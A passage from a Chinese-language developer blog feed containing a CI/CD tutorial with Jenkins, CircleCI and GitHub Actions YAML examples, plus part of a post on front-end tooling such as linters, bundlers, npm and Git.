src="https://linyencheng.github.io/2022/10/12/relationships-between-frontend-and-backend/tool-web-developer-debug/demo.apng" alt="demo"></p></blockquote><p>其實學了那麼多最容易的，就是明白大概的觀念後:</p><ul><li>搶票記得多開幾個瀏覽器，先把可以填的先填好，選完第一次沒搶到或沒回應不要灰心，放棄他換到另外一個瀏覽器，等其他人家交易失敗，因為任何因素都可能造成交易沒有成功</li><li>切記不要重新整理，可以直接送就再送一次，因為前一次沒成功你剛填的就還有效，就算再重新整理一次，也可能因為爆頻寬而拿不到任何資料。就像是一個正妹很多人 line ，但正妹頻寬已爆，已讀不回、不讀不回 QQ</li></ul><p>另外在網站測試時，前端、PM、後端、QA 常常會因為觀念跟知識不對等而無法重現問題，除了使用瀏覽器的開發者工具協助外，還會談談還有什麼基本的除錯觀念是我們需要知道的事情，相信在認知一致後的溝通會變得更加順暢。</p><p>常常我們看到的網頁跟別人看見的網頁不一樣，那了解情境並重現錯誤是第一步，再來當發布到測試環境時，因為網站會在很多地方有快取機制，所以建議底下幾種方法清除快取並刷新頁面，來確保大家看到的是同一個網頁。</p><p>清除網頁快取方式:</p><ol><li>用 <code>Ctrl+F5</code> 進行強制更新。</li><li>按 f12 開啟開發者工具之後，對瀏覽器上的重新整理按右鍵，開啟選項後選最下面 empty cache and hard reload。</li><li>按 f12 開啟開發者工具之後，去 Application 中清除。</li></ol><p>目前主流的網頁設計都是採前、後端分離的概念，那前端和後端的溝通，溝通上一定有一些<a href="https://linyencheng.github.io/2018/11/15/thinking-security/?utm_source=link&utm_medium=article&utm_campaign=internal_link">安全上需要注意的東西</a>，普遍也會針對這些點去做防範。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> CSS </tag>
            
            <tag> HTML </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CI/CD X Jenkins、CircleCI、Github Action</title>
      <link href="/2022/10/10/relationships-between-frontend-and-backend/devops-ci-cd-jenkins-circleci-and-github-action/"/>
      <url>/2022/10/10/relationships-between-frontend-and-backend/devops-ci-cd-jenkins-circleci-and-github-action/</url>
      
        <content type="html"><![CDATA[<p>偷吃完都有記得擦嘴嗎?! 背地裡在檯面下做了一些事情又不想被發現或影響另一半怎麼辦?! 有沒有辦法自動化的把相關痕跡去除或隱藏?!</p><p>當然正常情況下是要盡量避免做一些見不得光的事情，但總是有些人會如此，而 CI&#x2F;CD 的目的就是為了確保程式碼在提交之後，減少因為少部分檯面下的更動影響程式運行的流程，確保程式碼的品質。</p><h2 id="什麼是-CI-CD"><a href="#什麼是-CI-CD" class="headerlink" title="什麼是 CI&#x2F;CD?"></a>什麼是 CI&#x2F;CD?</h2><p>CI (Continuous Integration)、CD (Continuous Delivery&#x2F;Deployment) 目的是從測試、建置到部署自動化，取代原來人工需要做的事情。</p><ul><li>CI (Continuous Integration): 專注在持續整合，目的是讓經過測試的程式碼用最快的時間回到主幹中，透過程式碼的自動化測試和建置，將穩定品質的程式碼合併，越早頻繁整合，整合難度的就越低且能確保最新版本是可運行的，常見的流程會是當嘗試將更改推送到 Git Repo 時，Linter 和測試就會運行</li><li>CD (Continuous Delivery&#x2F;Deployment): 專注在持續部屬和交付，更快速且頻繁的去更新我們的服務，依照需要的環境進行建置和部屬</li></ul><blockquote><p><img src="https://blog.mergify.com/content/images/size/w1000/2022/03/0-TH1nBsXNDB5Njynk.PNG"><br>圖片來源: <a href="https://faun.pub/most-popular-ci-cd-pipelines-and-tools-ccfdce429867">Tony’s Schema</a></p></blockquote><p>CI&#x2F;CD 工具非常多元且通常採用自動化，常見的使用方法都是在專案中加入一個 <code>yaml</code> 設定檔進行配置，在整合過後也會提供一個可以嵌入的 CI&#x2F;CD 狀態標籤嵌入在網頁或是 <code>README.md</code> 裡面，顯示目前專案的狀態，常見的的服務常見的像是</p><ul><li>安裝版: Drone CI、Jenkins</li><li>第三方服務: Travis CI、CircleCI</li><li>版控平台服務: Github Action、Gitlab CI</li></ul><blockquote><p><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5iObfkTq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gzckt0dh9am2oc0q5z8n.png"><br>圖片來源: <a href="https://dev.to/hamitseyrek/what-is-continuous-integration-and-continuous-delivery-why-should-it-be-used-13en">Hamit SEYREK’s Schema</a></p></blockquote><p>常見的需求可能會是</p><ul><li>依照條件觸發執行對應任務</li><li>排程工作 (Cron Job): 定時執行一些測試任務</li></ul><p>這篇文章接下來會分別用不同的 CI&#x2F;CD 工具來做示範。</p><h3 id="排程工作-Cron-Job"><a href="#排程工作-Cron-Job" class="headerlink" title="排程工作 (Cron Job)"></a>排程工作 (Cron Job)</h3><p><a href="https://crontab.guru/">cron job</a> 的寫法，Linux 設定 <a href="/2019/07/13/tool-nginx/#Nginx-https-%E8%A8%AD%E5%AE%9A">crontab</a> 也是一樣的概念，通常有五個數字 <code>分 時 天 周 月</code> 可以填入相關數字或判斷式簡易寫法如下:</p><ul><li>每時 <code>0 * * * *</code></li><li>每天 <code>0 0 * * *</code></li><li>每周 <code>0 0 0 * *</code></li><li>每月 <code>0 0 0 0 *</code></li></ul><p>判斷式相關寫法如下:</p><ul><li><code>*</code> 任何值都會執行</li><li><code>,</code> 設定多個數字們可以用逗號分隔</li><li><code>-</code> 設定數字區間</li><li><code>/</code> 除法每八小時就可以 <code>*/8</code></li></ul><h2 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h2><p>首先介紹需要在本機安裝的 Jenkins，Jenkins 專注在流程自動化，假設流程是<strong>依照條件觸發執行對應任務</strong></p><ol><li>專案有新 commit: 需要偵測到有新的 commit</li><li>專案建置: 需要設定建置專案的環境</li><li>ftp 發佈: 需要設定 FTP 的相關帳密</li></ol><p>Jenkins 因為用 Java 運行，建議伺服器的記憶體至少有 1G，記憶體較小的主機也建議執行的配置上可以加上限制 <code>-Xmx512</code>。</p><ol><li><a href="https://jenkins.io/download/">下載後安裝</a></li><li>安裝可能會需要的 plugin<ul><li><a href="http://wiki.jenkins-ci.org/display/JENKINS/NodeJS+Plugin">NodeJS Plugin</a></li><li><a href="http://wiki.jenkins-ci.org/display/JENKINS/Publish+Over+FTP+Plugin">Publish Over FTP</a></li></ul></li><li>針對 plugin 做相關設置<ul><li>系統設定 ftp server 帳密</li><li>系統設定版控帳密</li><li>工具設定 node js 環境</li></ul></li></ol><p>接著是把流程自動化 commit 專案 -&gt; 專案建置 -&gt; ftp 發佈</p><ol><li>開始一個 free style 的專案，接著暴力的針對原始碼定期自動掃描<ul><li><code>Poll SCM H/10 * * * *</code> (十分鐘一次)</li></ul></li><li>設定 Build 的動作<ul><li>選擇 windows batch commend</li><li>npm install</li><li>npm run build</li></ul></li><li>設定 Post-build Actions<ul><li>將相關的建置後資料透過 ftp 發佈至伺服器</li></ul></li></ol><p>推薦外掛</p><ol><li><a href="https://wiki.jenkins.io/display/JENKINS/Startup+Trigger">Startup Trigger</a>：Jenkins 重啟後會自動重新建置</li><li>Workspace Cleanup Plugin: 節省空間</li></ol><h2 id="CircleCI"><a href="#CircleCI" class="headerlink" title="CircleCI"></a>CircleCI</h2><p>CircleCI 是能監控程式碼異動後自動做 CI&#x2F;CD 的工具，可以協助我們將 Github 上的專案進行持續整合，免費使用的話，每個月有 1,000 build minutes。</p><p>接下來會簡介部落格是怎麼做到自動化建置和發佈網站更新，原來的流程是當我們寫好一篇新的文章後，需要執行以下指令來完成發佈</p><ol><li><code>hexo clean</code></li><li><code>hexo generate</code></li><li><code>hexo deploy</code></li></ol><p>這次的目標是希望 CircleCI 做到<strong>依照條件觸發執行對應任務</strong>，當文章更新時能自動化發佈並更新部落格站台。</p><p>因為 hexo 本身有整合好發佈的 script，如果搭配 CircleCI 我們就可以讓文章發佈的動作自動化了，大概每次發佈都可以在 2 分鐘內結束。</p><p>Circle 是使用 YAML 檔進行設定的，所以首先需要在專案中跟目錄建立 <code>.circleci</code> 資料夾，並新增下面的 <code>config.yml</code> 到資料夾中。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Javascript Node CircleCI 2.0 configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Check https://circleci.com/docs/2.0/language-javascript/ for more details</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">docker:</span></span><br><span class="line">      <span class="comment"># specify the version you desire here</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">circleci/node:lts-bullseye-browsers-legacy</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Specify service dependencies here if necessary</span></span><br><span class="line">      <span class="comment"># CircleCI maintains a library of pre-built images</span></span><br><span class="line">      <span class="comment"># documented at https://circleci.com/docs/2.0/circleci-images/</span></span><br><span class="line">      <span class="comment"># - image: circleci/mongo:3.4.4</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">working_directory:</span> <span class="string">~/repo</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">checkout</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Download and cache dependencies</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">restore_cache:</span></span><br><span class="line">          <span class="attr">keys:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">v1-dependencies-&#123;&#123;</span> <span class="string">checksum</span> <span class="string">&quot;package.json&quot;</span> <span class="string">&#125;&#125;</span></span><br><span class="line">            <span class="comment"># fallback to using the latest cache if no exact match is found</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">v1-dependencies-</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">--legacy-peer-deps</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">save_cache:</span></span><br><span class="line">          <span class="attr">paths:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">v1-dependencies-&#123;&#123;</span> <span class="string">checksum</span> <span class="string">&quot;package.json&quot;</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># run tests!</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">clean</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">run</span> <span class="string">generate</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">deploy:</span></span><br><span class="line">          <span class="attr">command:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            git config --global user.email $GH_EMAIL</span></span><br><span class="line"><span class="string">            git config --global user.name $GH_NAME</span></span><br><span class="line"><span class="string">            npm run deploy</span></span><br></pre></td></tr></table></figure><p>放了之後執行可能會發現有點問題，因為還有一些注意事項要記得：</p><ol><li>要去專案設定中加入 SSH key，並確認是擁有讀寫權限的，這樣自動發佈才會正常</li><li>如果專案是開放的，個資可以放在 CircleCI 環境變數中，<code>$GH_EMAIL</code>、<code>$GH_NAME</code></li><li>因為全域環境中沒有安裝 hexo，所以才需要新增 npm script 去取代 hexo script</li></ol><p>都確認之後再執行一次看看，如果亮綠燈的話就恭喜，以後寫完就只要 push 到 github 剩下的工作就交給 CircleCI。</p><h2 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h2><p>接下來將提到怎麼透過 Github Action 來執行<strong>排程工作 (Cron Job)</strong> 自動定期更新疫情地圖資料。</p><p>由於<a href="/2020/02/05/js-virus-and-where-to-find-them/">武漢肺炎疫情地圖</a>的專案在 Github 直覺若要透過第三方服務遠端 Push 新的檔案會有些困難，所以選則使用 Github Action。</p><p>導入的步驟首先要挑選 market 中相關的 actions，如果使用預設產生的會自動帶有 <code>actions/checkout</code> 主要用來 checkout Repo 的程式碼。</p><p>market 的傳送門如下:<br><a href="https://github.com/marketplace?type=actions">https://github.com/marketplace?type=actions</a></p><p>因為我們需要定期更新自動 push 新的資料，所以我們會需要 <code>token</code> 還有了解 <a href="https://crontab.guru/">cron job</a> 的寫法。</p><p>這次<a href="/2020/02/05/js-virus-and-where-to-find-them/">疫情地圖專案</a>導入的步驟如下:</p><ul><li>專案 &#x3D;&gt; 設定 &#x3D;&gt; Secrets &#x3D;&gt; 加入 github-token</li><li>專案中的 <code>/.github/workflows</code> 加入 <code>&#123;name&#125;.yml</code> 檔案</li><li>設定 Github Action 的 Cron Job 還有需要更新的分支</li><li>執行產生 JSON 檔的 JS</li><li>github page 需要 <code>JamesIves/github-pages-deploy-action@v4.2.3</code> 一樣也是直接使用加上相關配置</li><li>快取 <code>actions/cache</code><ul><li>透過把 node_modules 快取可以避免每次執行都重新安裝</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 給一個名字</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">Node</span> <span class="string">CI</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 設定 Github Action 的 Cron Job 還有需要更新的分支</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="comment"># * is a special character in YAML so you have to quote this string</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;1 2-6/2 * * *&quot;</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">strategy:</span></span><br><span class="line">      <span class="attr">matrix:</span></span><br><span class="line">        <span class="attr">node-version:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">16.</span><span class="string">x</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">repository</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v1</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node-version</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">$&#123;&#123;</span> <span class="string">matrix.node-version</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Cache</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/cache@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            **/node_modules</span></span><br><span class="line"><span class="string"></span>          <span class="attr">key:</span> <span class="string">$&#123;&#123;</span> <span class="string">runner.os</span> <span class="string">&#125;&#125;-$&#123;&#123;</span> <span class="string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">generate</span> <span class="string">new</span> <span class="string">build</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm run generate</span></span><br><span class="line"><span class="string">          npm run build</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">🚀</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">JamesIves/github-pages-deploy-action@v4.2.3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">branch:</span> <span class="string">gh-pages</span> <span class="comment"># The branch the action should deploy to.</span></span><br><span class="line">          <span class="attr">folder:</span> <span class="string">docs</span> <span class="comment"># The folder the action should deploy.</span></span><br><span class="line">          <span class="attr">git-config-name:</span> <span class="string">Github</span> <span class="string">Action</span></span><br><span class="line">          <span class="attr">git-config-email:</span> <span class="number">41898282</span><span class="string">+github-actions[bot]@users.noreply.github.com</span></span><br><span class="line">          <span class="attr">commit-message:</span> <span class="string">&quot;chore: publish with new data&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> DevOps </tag>
            
            <tag> CI/CD </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8 個寫 JavaScript 前該懂的問題</title>
      <link href="/2022/10/09/relationships-between-frontend-and-backend/js-client-side-tools/"/>
      <url>/2022/10/09/relationships-between-frontend-and-backend/js-client-side-tools/</url>
      
        <content type="html"><![CDATA[<p>經過了一陣子的學習，小編認為有 8 個寫 JavaScript 前可以思考的問題，這就好像談戀愛前，我們必須</p><p>👉 理解自己是什麼特質的人<br>👉 懂得發揮自己的特長和優勢<br>👉 盡可能探索與了解自己所愛的事物</p><p>才不會明明是沉穩、內斂的人卻硬要變得開放、外向、愛講笑話、學炒熱氣氛，反而應該是要找到適合使用的道具和發揮特長和優勢的場合。</p><p>接下來就來一題題看下去，那些關於前端，有哪些該知道的小撇步吧。</p><h3 id="怎麼知道撰寫的-JavaScript-語法是否正確"><a href="#怎麼知道撰寫的-JavaScript-語法是否正確" class="headerlink" title="怎麼知道撰寫的 JavaScript 語法是否正確?"></a>怎麼知道撰寫的 JavaScript 語法是否正確?</h3><blockquote><p>Class 開頭到底要大寫還小寫?</p></blockquote><p>同個團隊有幾個人就很可能有幾種不同的撰寫風格，即便絕大多數人都同意寫 Java 時 Class 開頭大寫，但仍可以發現有同事會寫 Class 時用小寫開頭的命名。</p><p>Linter 會協助檢查程式碼品質找到可能的錯誤並提示，目前存在的錯誤類型以及在哪一行出現的工具。</p><p>VS code 提供了整合數種 Linter 的外掛給大家使用，常見推薦如下:</p><ul><li>webhint</li><li>ESLint</li><li>StyleLint</li><li>Sass Lint</li><li>markdownlint</li></ul><blockquote><p>日新月異的語法超多就跟撩妹金句一樣，真的有辦法記起來也能用對地方嗎?</p></blockquote><p>除此之外其實也有相當多的工具能夠協助開發，以 VS code 來說，<a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">各種語言的 Extension Pack</a>，能提供語法的提示或模板來協助我們進行相關的開發:</p><ul><li>React Extension Pack</li><li>Node.js Extension Pack</li><li>Extension Pack for Java</li><li>Spring Boot Extension Pack</li></ul><h3 id="如何決定團隊程式撰寫風格與格式"><a href="#如何決定團隊程式撰寫風格與格式" class="headerlink" title="如何決定團隊程式撰寫風格與格式?"></a>如何決定團隊程式撰寫風格與格式?</h3><blockquote><p>程式碼風格重要的是一致，那該怎麼做到一致?</p></blockquote><p><a href="https://linyencheng.github.io/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/">程式碼格式化的工具在某種程度上會和上一題的 Linter 有關</a>，但格式化工具並不會指出程式碼的錯誤，比較著重在排版與命名等等，並且透過工具能自動修復相關的錯誤。</p><p>Prettier 是一個非常流行的程式碼格式化工具，也建議直接搭配 Airbnb JavaScript Style Guide，再慢慢改成適合自己團隊的樣子。</p><p>小編之前的主管曾說希望團隊中寫出來的程式碼都要像同一個人寫出來的，幾年後，發現簡單的一句話中包含了:</p><ul><li>程式碼的架構要統一</li><li>程式碼撰寫風格要統一</li><li>程式碼的排版要統一</li></ul><h3 id="該怎麼處理跨這麼多瀏覽器的支援度"><a href="#該怎麼處理跨這麼多瀏覽器的支援度" class="headerlink" title="該怎麼處理跨這麼多瀏覽器的支援度?"></a>該怎麼處理跨這麼多瀏覽器的支援度?</h3><blockquote><p>新潮語法那麼多，瀏覽器真的能夠支援嗎?</p></blockquote><p>當你不知道該怎麼回答的時候，請參考 <a href="https://caniuse.com/">Can I Use</a> 這個網站。</p><p>大家都知道徵友信沒辦法用同樣一種罐頭信一直狂寄，會需要依照對方想知道的東西去些微的客製化才有辦法得到對方的青睞。</p><p>新語法在跨瀏覽器的支援度也是這個概念，但有的時候新的寫法還是比較方便，這時候就會需要翻譯蒟蒻，協助將新的語法補上各瀏覽器需要的部分:</p><ul><li>Babel: 是一個 JavaScript 編譯器，能讓開發人員使用最先進的 JavaScript 語法 (ES6)，然後 Babel 會轉換為更多瀏覽器可以理解的 JavaScript (ES5)</li><li>TypeScript: 是 JavaScript 的超集合，提供了許多附加功能，同樣的 TypeScript 編譯器會將 TypeScript 代碼轉換為 JavaScript</li><li>PostCSS: 能讓開發人員使用最先進的 CSS 功能，如果沒有等效的方法來使用舊的 CSS 功能，PostCSS 會協助安裝 JavaScript polyfill 來模擬想要的 CSS 效果</li></ul><h3 id="為什麼前端需要工程化和工程師？"><a href="#為什麼前端需要工程化和工程師？" class="headerlink" title="為什麼前端需要工程化和工程師？"></a>為什麼前端需要工程化和工程師？</h3><blockquote><p>專案部屬前到底是在 Build 什麼?</p></blockquote><p>早期的網頁只是靜態頁面，現在則需要許多複雜的互動，所以漸漸出現各種理論和概念，也就漸漸出現了工程化的相關工具來協助套件的整合與程式碼最佳化。</p><p>模組可以理解是在情場小白在跟女孩相處的過程中卻意外擁有把妹高手前同事提供的 “教戰守則”，同事總會在一些時間、情境時告訴你一些小撇步讓男女之間感情升溫。</p><p>打包工具則是在這些 “鍛鍊” 的過程中，讓 “教戰守則” 能夠自然且最佳化的融入到自身進而能夠靈活的運用。</p><p>在比較大型的前端專案當中，建置工具可以說是必備，主要協助的工作像是</p><ul><li>tree-shaking 只加入有用到的部分</li><li>Dead Code elimination 移除不會使用的</li><li>Code Splitting 程式碼拆分</li><li>Minify 最小化</li></ul><p>目前主流主要有<a href="https://linyencheng.github.io/2022/10/05/relationships-between-frontend-and-backend/js-module-loader/">三種打包工具</a></p><ul><li>Parcel: 聰明且方便的工具，不需要多餘配置就能夠將 HTML、CSS 和圖片打包，然後就可以繼續完成部署</li><li>Rollup: 用途主要是用來封裝模組出來給他人使用，所以配置檔中也特別強調可以輸出各種不同的格式</li><li>Webpack: 是另一個非常流行的打包工具，算是目前主流</li></ul><h3 id="該怎麼管理各式各樣的套件"><a href="#該怎麼管理各式各樣的套件" class="headerlink" title="該怎麼管理各式各樣的套件?"></a>該怎麼管理各式各樣的<code>套件</code>?</h3><blockquote><p>什麼是套件管理? 怎麼在專案中使用套件和保持套件的版本?</p></blockquote><p>套件做到的事就是別人已經研究過的東西我們可以不需要再研究一次，就像增加魅力的日常穿搭或是實用小物來說，我們其實就可以透過閱讀一些日雜來學習和應用。</p><p>小編甚至發現一些日雜還會附贈一些 C&#x2F;P 值高也實用好看的小物，透過別人整理好的套件，雖然沒辦法個人和客製化，但也能夠在各方面快速達到一個水平，這就是套件的好處。</p><p>套件管理工具就像是那些雜誌或是懶人包的型錄，能快速幫我們在方方面面進入狀況，要把到妹跟專案能不能上線似乎有點類似，最重要的就是快速在各方面都能達到某些限制條件的水平。</p><p>JavaScript 常用的套件管理工具是 npm，npm 是 Node Package Manager 的縮寫，是 <a href="https://nodejs.org/zh-tw/">Node.js</a> 預設的 node 套件管理平台。</p><p>本機端的相關工具在<a href="https://nodejs.org/zh-tw/">安裝 node.js</a> 時也會一起安裝，另一套 Package Manager 本機端工具則是 <a href="https://yarnpkg.com/">Facebook 推出的 Yarn</a>，<a href="https://linyencheng.github.io/2022/09/27/relationships-between-frontend-and-backend/tool-npm/">透過 Package Manager 指令開發者就能更方便進行套件的管理動作 (安裝、升級或刪除)</a>。</p><p>當然在簡單的專案中，我們可以手動透過 CDN 引入相關的套件即可。</p><h3 id="程式碼的版本該怎麼管理"><a href="#程式碼的版本該怎麼管理" class="headerlink" title="程式碼的版本該怎麼管理?"></a>程式碼的版本該怎麼管理?</h3><blockquote><p>還在用開資料夾加上日期的方法管理檔案嗎?</p></blockquote><p>在時間管理大師的世界裡，記住曾經和每個對象的回憶跟說過的話是很重要的，隨著對象越多就越有可能在某天踢到鐵板?!</p><p>如果對象與對象之間的相似性和重疊性越高，就可能面臨不敢改變的風險，譬如工作譬如興趣譬如作息譬如說過的情話，隨著時光飛逝，該怎麼好好記錄和應對?!</p><p>在專案中套件與套件間也可能產生相依性，那當版本需要升級時該怎麼評估和測試可能的影響?</p><p>雖然人生沒有辦法版本控制也沒辦法回到從前，但寫程式可以，到了專案不同的階段，也許也會想要再次回頭嘗試看看過去的解決方案。</p><p><a href="https://linyencheng.github.io/2022/09/28/relationships-between-frontend-and-backend/tool-semantic-version-and-release/">語意化版本</a>與<a href="https://linyencheng.github.io/2022/09/29/relationships-between-frontend-and-backend/tool-git-with-project/">版本控制系統 (VCS)</a> 這時候就扮演相當重要的角色，才不會發生有人說出 “我覺得上上禮拜 Demo 的第二個版本比較好” 這種需要工程師通靈的工作模式。</p><ul><li>語意化版本 (Semantic Versioning)，目標是讓用戶可以透過版本號看出相關資訊</li><li>版本控制系統 (VCS): Git 是主流的工具，常用的服務如 GitHub、GitLab 或 BitBucket</li></ul><h3 id="為什麼該學習新的框架或概念去撰寫網站"><a href="#為什麼該學習新的框架或概念去撰寫網站" class="headerlink" title="為什麼該學習新的框架或概念去撰寫網站?"></a>為什麼該學習新的框架或概念去撰寫網站?</h3><blockquote><p>用新的概念與方式去實作跟組織程式碼可以嗎?</p></blockquote><p>前端的框架跟函式庫百百種，究竟該怎麼選?</p><p>其實這跟伴侶的選擇有點像，要選當下適合我們的而非一昧的追求最好，當需求與供給沒辦法對應時，勉強別人接受並不公平，勉強自己適應也很痛苦。</p><p>函式庫和框架的選擇也是，實際上遇到的問題絕對都有一種以上的解決方案，而哪種方式才是最適合的就該好好想想。</p><p>在簡單的專案使用框架只會增加複雜度，在複雜專案的使用卻讓專案變得單純，所以該不該使用框架，端看各位大大遇到問題的維度和情境。</p><p><a href="https://linyencheng.github.io/2022/10/08/relationships-between-frontend-and-backend/js-library-and-framework/">React、Angular、Vue 的出現就是新的概念去進行開發</a>，進而達到提升執行效能又能降低維護難度的開發架構，主流框架大致都有以下特性</p><ul><li>元件驅動開發</li><li>資料流跟畫面分離</li><li>狀態管理機制</li><li>網站的效能提升</li></ul><p>隨著撰寫樣式檔開始越來越複雜，也因為 CSS 語法受限而發展出 <a href="https://linyencheng.github.io/2022/09/08/relationships-between-frontend-and-backend/css-pre-post-processors/">CSS Pre-&#x2F;Post-processors (預處理和後處理)</a> 來拓展和優化寫法，Sass&#x2F;SCSS 讓 CSS 可以使用嵌套規則、mixin、函數等等在原生 CSS 